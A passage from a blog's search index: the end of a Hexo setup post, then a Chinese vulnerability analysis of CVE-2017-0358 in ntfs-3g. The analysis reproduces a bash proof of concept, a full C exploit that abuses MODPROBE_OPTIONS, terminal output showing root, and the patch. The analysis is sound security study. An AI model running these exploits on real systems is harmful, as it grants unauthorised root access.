4. hero-generator-feed支持 RSS 订阅，安装 hexo-generator-feed1npm install hexo-generator-feed --save 修改 hexo 配置123456feed: type: atom path: atom.xml limit: 5 #在feed中出现的最大文章数（使用0或者false）来显示所有文章 hub: content: 修改主题配置123- page: rss directory: atom.xml icon: fa-rss 5. 生成站点地图通过站点地图生成插件生成sitemap，进行SEO优化。 安装插件 12npm install hexo-generator-sitemap --savenpm install hexo-generator-baidu-sitemap --save 生成站点地图,修改/_config.yml文件，添加如下配置： # 自动生成sitemap sitemap: path: sitemap.xml baidusitemap: path: baidusitemap.xml 编译hexo g，在 public 目录下可以看到sitemap.xml和baidusitemap.xml文件，重新发布至服务器hexo d。 0x04 未完待续 待站点被收录后，上传sitemap.xml； 显示分类文章总数(目测有难度) 开启评论","categories":[{"name":"技术分享","slug":"技术分享","permalink":"http://maskhed.github.io/categories/技术分享/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://maskhed.github.io/tags/Hexo/"}]},{"title":"CVE-2017-0358","slug":"CVE-2017-0358","date":"2018-10-21T07:23:44.000Z","updated":"2018-12-20T03:56:48.783Z","comments":true,"path":"2018/10/21/CVE-2017-0358/","link":"","permalink":"http://maskhed.github.io/2018/10/21/CVE-2017-0358/","excerpt":"CVE-2017-0358，Linux本地提权漏洞。","text":"CVE-2017-0358，Linux本地提权漏洞。 0x00 ntfs-3g (Debian 9) - Privilege Escalation 最近研究了下CVE-2017-0358，Linux下的本地提权漏洞，记录下学习历程。最初是在exploit-db上发现该漏洞ntfs-3g (Debian 9) - Privilege Escalation，并附有EXP，在简单学习了FUSE、NTFS-3G等基础概念后尝试利用作者给出的EXP复现漏洞。EXP如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/bin/bashecho \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\"echo \"@ CVE-2017-0359, PoC by Kristian Erik Hermansen @\"echo \"@ ntfs-3g local privilege escalation to root @\"echo \"@ Credits to Google Project Zero @\"echo \"@ Affects: Debian 9/8/7, Ubuntu, Gentoo, others @\"echo \"@ Tested: Debian 9 (Stretch) @\"echo \"@ Date: 2017-02-03 @\"echo \"@ Link: https://goo.gl/A9I8Vq @\"echo \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\"echo \"[*] Gathering environment info ...\"cwd=\"$(pwd)\"un=\"$(uname -r)\"dlm=\"$(pwd)/lib/modules\"dkf=\"$(pwd)/kernel/fs\"echo \"[*] Creating kernel hijack directories ...\"mkdir -p \"$&#123;dlm&#125;\"mkdir -p \"$&#123;dkf&#125;\"echo \"[*] Forging symlinks ...\"ln -sf \"$&#123;cwd&#125;\" \"$&#123;dlm&#125;/$&#123;un&#125;\"ln -sf \"$&#123;cwd&#125;\" \"$&#123;dkf&#125;/fuse\"ln -sf cve_2017_0358.ko fuse.koecho \"[*] Pulling in deps ... \"echo \"[*] Building kernel module ... \"cat &lt;&lt; 'EOF' &gt; cve_2017_0358.c#include &lt;linux/module.h&gt;MODULE_LICENSE(\"CC\");MODULE_AUTHOR(\"kristian erik hermansen &lt;kristian.hermansen+CVE-2017-0358@gmail.com&gt;\");MODULE_DESCRIPTION(\"PoC for CVE-2017-0358 from Google Project Zero\");int init_module(void) &#123; printk(KERN_INFO \"[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\\n\"); char *envp[] = &#123; \"HOME=/tmp\", NULL &#125;; char *argv[] = &#123; \"/bin/sh\", \"-c\", \"/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t\", NULL &#125;; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); char *argvv[] = &#123; \"/bin/sh\", \"-c\", \"/sbin/rmmod cve_2017_0358\", NULL &#125;; call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC); return 0;&#125;void cleanup_module(void) &#123; printk(KERN_INFO \"[*] CVE-2017-0358 exploit unloading ...\\n\");&#125;EOFcat &lt;&lt; 'EOF' &gt; Makefileobj-m += cve_2017_0358.oall: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) cleanEOFmake 1&gt;/dev/null 2&gt;/dev/null || echo \"[-] FAILED: your need make / build tools\"cp \"/lib/modules/$&#123;un&#125;/modules.dep.bin\" . || echo \"[-] FAILED: linux-image location non-default?\"MODPROBE_OPTIONS=\"-v -d $&#123;cwd&#125;\" ntfs-3g /dev/null /dev/null 1&gt;/dev/null 2&gt;/dev/null/tmp/r00t -c 'whoami' | egrep -q 'root' &amp;&amp; echo \"[+] SUCCESS: You have root. Don't be evil :)\"/tmp/r00t 疑惑的是无论如何测试，始终不成功，最后怀疑是modprobe函数的问题，查看官方文档，给出如下解释： The modprobe command silently succeeds with an exit status of 0 if it successfully loads the module, or the module is already loaded into the kernel.Thus, you must ensure that the module is not already loaded before attempting to load it with custom parameters. The modprobe command does not automatically reload the module, or alert you that it is already loaded. 也就是说，无法解决在系统已加载FUSE模块的前提下重新加载FUSE，并使临时参数生效的问题。黔驴技穷，于是发邮件给作者，作（骗）者（子）赤果果的say：“need additional modification，you have to make me an offer”,shit… （注：jannh已在www.exploit-db.com上发布有效版本，ntfs-3g - Unsanitized modprobe Environment Privilege Escalation） 0x01 ntfs-3g: modprobe is executed with unsanitized environment 在经历过艰苦的search之后，终于发现了漏洞的真正作者project zero的jannh(ntfs-3g: modprobe is executed with unsanitized environment)。 漏洞存在于NTFS-3G之中，该程序是由Tuxera公司开发并维护的开源项目，目的是为Linux提供NTFS分区的驱动程序，实现对NTFS文件系统的读写。该程序默认安装在Ubuntu等操作系统中，并且赋予了setuid的权限。作者解释到CVE-2017-0358的根源在于，NTFS-3G在调用modprobe时没有初始化环境变量，致使存在本地提权的风险。漏洞存在于load_fuse_module ()函数之中： 1234567891011121314151617181920212223242526272829303132static fuse_fstype load_fuse_module(void)&#123; int i; struct stat st; pid_t pid; const char *cmd = \"/sbin/modprobe\"; struct timespec req = &#123; 0, 100000000 &#125;; /* 100 msec */ fuse_fstype fstype; if (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123; pid = fork(); if (!pid) &#123; execl(cmd, cmd, \"fuse\", NULL); _exit(1); &#125; else if (pid != -1) waitpid(pid, NULL, 0); &#125; for (i = 0; i &lt; 10; i++) &#123; /* * We sleep first because despite the detection of the loaded * FUSE kernel module, fuse_mount() can still fail if it's not * fully functional/initialized. Note, of course this is still * unreliable but usually helps. */ nanosleep(&amp;req, NULL); fstype = get_fuse_fstype(); if (fstype != FSTYPE_NONE) break; &#125; return fstype;&#125; 当NTFS-3G被调用时，利用get_fuse_fstype()检测当前系统是否加载FUSE模块，若未加载，则利用load_fuse_module()中的modprobe，加载FUSE模块。 1234567891011121314151617181920212223static fuse_fstype get_fuse_fstype(void)&#123; char buf[256]; fuse_fstype fstype = FSTYPE_NONE; FILE *f = fopen(\"/proc/filesystems\", \"r\"); if (!f) &#123; ntfs_log_perror(\"Failed to open /proc/filesystems\"); return FSTYPE_UNKNOWN; &#125; while (fgets(buf, sizeof(buf), f)) &#123; if (strstr(buf, \"fuseblk\\n\")) &#123; fstype = FSTYPE_FUSEBLK; break; &#125; if (strstr(buf, \"fuse\\n\")) fstype = FSTYPE_FUSE; &#125; fclose(f); return fstype;&#125; 问题在于，modprobe的设计初衷并不是运行在一个setuid的环境当中，而NTFS-3G却需要setuid的权限。在modprobe的man文档中明确指出： The MODPROBE_OPTIONS environment variable can also be used to pass arguments to modprobe. 因此，在一个尚未加载FUSE 的系统中，攻击者可以通过设置环境变量MODPROBE_OPTIONS “-C /tmp/evil_config -d /tmp/evil_root”，强制modprobe加载恶意配置文件，导致攻击者具备加载任意代码到系统内核的能力。 在现实情况中，FUSE在大部分系统中已被作为内核的一部分，基本都处于已加载的状态，也就是文章伊始提到的问题。 jannh对这个问题给出了一种解决思路，通过耗尽系统范围内所有进程可以打开的文件句柄的数量 (/proc/sys/fs/file-max)，使得NTFS-3G在fopen(&quot;/proc/filesystems&quot;, &quot;r&quot;)时异常，导致get_fuse_fstype()返回FSTYPE_UNKNOWN，在主函数中触发load_fuse_module()函数。 123456789101112fstype = get_fuse_fstype();err = NTFS_VOLUME_NO_PRIVILEGE;if (restore_privs()) goto err_out;if (fstype == FSTYPE_NONE || fstype == FSTYPE_UNKNOWN) fstype = load_fuse_module();create_dev_fuse();if (drop_privs()) goto err_out; 0x02 Attack jannh给出了EXP，通过测试成功在Ubuntu Server 16.10、kali 4.3中实现提权，在Debian 8中测试失败。测试如下：（注：在VM中测试时，需要多CPU的支持） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647user@ubuntu:~$ tar xf ntfs-3g-modprobe-unsafe.taruser@ubuntu:~$ cd ntfs-3g-modprobe-unsafe/user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./compile.shmake: Entering directory '/usr/src/linux-headers-4.8.0-32-generic' CC [M] /home/user/ntfs-3g-modprobe-unsafe/rootmod.o Building modules, stage 2. MODPOST 1 modules CC /home/user/ntfs-3g-modprobe-unsafe/rootmod.mod.o LD [M] /home/user/ntfs-3g-modprobe-unsafe/rootmod.komake: Leaving directory '/usr/src/linux-headers-4.8.0-32-generic'depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.order: No such file or directorydepmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.builtin: No such file or directoryuser@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./sploitlooks like we won the racegot ENFILE at 198088 totalFailed to open /proc/filesystems: Too many open files in system yay, modprobe ran!modprobe: ERROR: ../libkmod/libkmod.c:514 lookup_builtin_file() could not open builtin file '/tmp/ntfs_sploit.u48sGO/lib/modules/4.8.0-32-generic/modules.builtin.bin'modprobe: ERROR: could not insert 'rootmod': Too many levels of symbolic linksError opening '/tmp/ntfs_sploit.u48sGO/volume': Is a directoryFailed to mount '/tmp/ntfs_sploit.u48sGO/volume': Is a directorywe have root privs now...root@ubuntu:~/ntfs-3g-modprobe-unsafe# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lxd),123(libvirt),127(sambashare),128(lpadmin),1000(user) 0x03 Code: Exploit.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176int main(void) &#123;/* prevent shell from backgrounding ntfs-3g when stopped */pid_t initial_fork_child = fork();if (initial_fork_child == -1) err(1, \"initial fork\");if (initial_fork_child != 0) &#123; int status; if (waitpid(initial_fork_child, &amp;status, 0) != initial_fork_child) err(1, \"waitpid\"); execl(\"rootshell\", \"rootshell\", NULL); exit(0);&#125;char buf[1000] = &#123;0&#125;;// Set up workspace with volume, mountpoint, modprobe config and module directory.char template[] = \"/tmp/ntfs_sploit.XXXXXX\";if (mkdtemp(template) == NULL) err(1, \"mkdtemp\");char volume[100], mountpoint[100], modprobe_confdir[100], modprobe_conffile[100];sprintf(volume, \"%s/volume\", template);sprintf(mountpoint, \"%s/mountpoint\", template);sprintf(modprobe_confdir, \"%s/modprobe.d\", template);sprintf(modprobe_conffile, \"%s/sploit.conf\", modprobe_confdir);if (mkdir(volume, 0777) || mkdir(mountpoint, 0777) || mkdir(modprobe_confdir, 0777)) err(1, \"mkdir\");int conffd = open(modprobe_conffile, O_WRONLY|O_CREAT, 0666);if (conffd == -1) err(1, \"open modprobe config\");int suidfile_fd = open(\"rootshell\", O_RDONLY);if (suidfile_fd == -1) err(1, \"unable to open ./rootshell\");char modprobe_config[200];sprintf(modprobe_config, \"alias fuse rootmod\\noptions rootmod suidfile_fd=%d\\n\", suidfile_fd);if (write(conffd, modprobe_config, strlen(modprobe_config)) != strlen(modprobe_config)) errx(1, \"modprobe config write failed\");close(conffd);// module directory setupchar system_cmd[1000];sprintf(system_cmd, \"mkdir -p %s/lib/modules/$(uname -r) &amp;&amp; cp rootmod.ko *.bin %s/lib/modules/$(uname -r)/\", template, template);if (system(system_cmd)) errx(1, \"shell command failed\");// Set up inotify watch for /proc/mounts.// Note: /proc/mounts is a symlink to /proc/self/mounts, so// the watch will only see accesses by this process.int inotify_fd = inotify_init1(IN_CLOEXEC);if (inotify_fd == -1) err(1, \"unable to create inotify fd?\");if (inotify_add_watch(inotify_fd, \"/proc/mounts\", IN_OPEN) == -1) err(1, \"unable to watch /proc/mounts\");// Set up inotify watch for /proc/filesystems.// This can be used to detect whether we lost the race.int fs_inotify_fd = inotify_init1(IN_CLOEXEC);if (fs_inotify_fd == -1) err(1, \"unable to create inotify fd?\");if (inotify_add_watch(fs_inotify_fd, \"/proc/filesystems\", IN_OPEN) == -1) err(1, \"unable to watch /proc/filesystems\");// Set up inotify watch for /sbin/modprobe.// This can be used to detect when we can release all our open files.int modprobe_inotify_fd = inotify_init1(IN_CLOEXEC);if (modprobe_inotify_fd == -1) err(1, \"unable to create inotify fd?\");if (inotify_add_watch(modprobe_inotify_fd, \"/sbin/modprobe\", IN_OPEN) == -1) err(1, \"unable to watch /sbin/modprobe\");int do_exec_pipe[2];if (pipe2(do_exec_pipe, O_CLOEXEC)) err(1, \"pipe\");pid_t child = fork();if (child == -1) err(1, \"fork\");if (child != 0) &#123; if (read(do_exec_pipe[0], buf, 1) != 1) errx(1, \"pipe read failed\"); char modprobe_opts[300]; sprintf(modprobe_opts, \"-C %s -d %s\", modprobe_confdir, template); setenv(\"MODPROBE_OPTIONS\", modprobe_opts, 1); execlp(\"ntfs-3g\", \"ntfs-3g\", volume, mountpoint, NULL);&#125;child = getpid();// Now launch ntfs-3g and wait until it opens /proc/mountsif (write(do_exec_pipe[1], buf, 1) != 1) errx(1, \"pipe write failed\");if (read(inotify_fd, buf, sizeof(buf)) &lt;= 0) errx(1, \"inotify read failed\");if (kill(getppid(), SIGSTOP)) err(1, \"can't stop setuid parent\");// Check whether we won the main race.struct pollfd poll_fds[1] = &#123;&#123; .fd = fs_inotify_fd, .events = POLLIN&#125;&#125;;int poll_res = poll(poll_fds, 1, 100);if (poll_res == -1) err(1, \"poll\");if (poll_res == 1) &#123; puts(\"looks like we lost the race\"); if (kill(getppid(), SIGKILL)) perror(\"SIGKILL after lost race\"); char rm_cmd[100]; sprintf(rm_cmd, \"rm -rf %s\", template); system(rm_cmd); exit(1);&#125;puts(\"looks like we won the race\");// Open as many files as possible. Whenever we have// a bunch of open files, move them into a new process.int total_open_files = 0;while (1) &#123; #define LIMIT 500 int open_files[LIMIT]; bool reached_limit = false; int n_open_files; for (n_open_files = 0; n_open_files &lt; LIMIT; n_open_files++) &#123; open_files[n_open_files] = eventfd(0, 0); if (open_files[n_open_files] == -1) &#123; if (errno != ENFILE) err(1, \"eventfd() failed\"); printf(\"got ENFILE at %d total\\n\", total_open_files); reached_limit = true; break; &#125; total_open_files++; &#125; pid_t fd_stasher_child = fork(); if (fd_stasher_child == -1) err(1, \"fork (for eventfd holder)\"); if (fd_stasher_child == 0) &#123; prctl(PR_SET_PDEATHSIG, SIGKILL); // close PR_SET_PDEATHSIG race window if (getppid() != child) raise(SIGKILL); while (1) pause(); &#125; for (int i = 0; i &lt; n_open_files; i++) close(open_files[i]); if (reached_limit) break;&#125;// Wake up ntfs-3g and keep allocating files, then free up// the files as soon as we're reasonably certain that either// modprobe was spawned or the attack failed.if (kill(getppid(), SIGCONT)) err(1, \"SIGCONT\");time_t start_time = time(NULL);while (1) &#123; for (int i=0; i&lt;1000; i++) &#123; int efd = eventfd(0, 0); if (efd == -1 &amp;&amp; errno != ENFILE) err(1, \"gapfiller eventfd() failed unexpectedly\"); &#125; struct pollfd modprobe_poll_fds[1] = &#123;&#123; .fd = modprobe_inotify_fd, .events = POLLIN &#125;&#125;; int modprobe_poll_res = poll(modprobe_poll_fds, 1, 0); if (modprobe_poll_res == -1) err(1, \"poll\"); if (modprobe_poll_res == 1) &#123; puts(\"yay, modprobe ran!\"); exit(0); &#125; if (time(NULL) &gt; start_time + 3) &#123; puts(\"modprobe didn't run?\"); exit(1); &#125;&#125;&#125; 0x04 补丁代码，load_fuse_module()函数 http://seclists.org/oss-sec/2017/q1/307 123456789101112131415 struct stat st; pid_t pid; const char *cmd = \"/sbin/modprobe\";+ char *env = (char*)NULL; struct timespec req = &#123; 0, 100000000 &#125;; /* 100 msec */ fuse_fstype fstype; if (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123; pid = fork(); if (!pid) &#123;- execl(cmd, cmd, \"fuse\", NULL);+ execle(cmd, cmd, \"fuse\", NULL, &amp;env); _exit(1); &#125; else if (pid != -1) waitpid(pid, NULL, 0);","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://maskhed.github.io/categories/漏洞分析/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"http://maskhed.github.io/tags/CVE/"}]}]}